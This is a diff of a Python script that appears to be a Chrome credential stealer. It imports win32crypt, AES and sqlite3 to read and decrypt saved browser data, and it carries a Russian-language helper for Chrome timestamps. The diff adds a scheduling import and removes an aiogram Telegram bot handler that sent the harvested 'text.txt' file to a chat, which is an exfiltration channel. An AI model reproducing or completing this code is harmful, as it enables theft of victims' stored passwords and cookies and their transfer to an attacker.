@@ -1,3 +1,4 @@
+from Crypto.Cipher import AES
 import os
 import logging
 import asyncio
@@ -6,12 +7,9 @@ import json
 import base64
 import sqlite3
 import win32crypt
-from Crypto.Cipher import AES
+import schedule
 import shutil
 from datetime import timezone, datetime, timedelta
-
-bot = Bot(token='TOKEN')
-dp = Dispatcher(bot)
 
 def get_chrome_datetime(chromedate):
     """Вернуть объект datetime.datetime из формата datetime в chrome
@@ -85,12 +83,5 @@ def main():
     except:
         pass
 
-@dp.message_handler()
-async def send_file(message: types.Message):
-    file = open("text.txt","rb")
-    await bot.send_document(message.chat.id, file)
-    await bot.send_document(message.chat.id, "FILEID")
-
 if __name__ == "__main__":
     main()
-    executor.start_polling(dp, skip_updates=True)
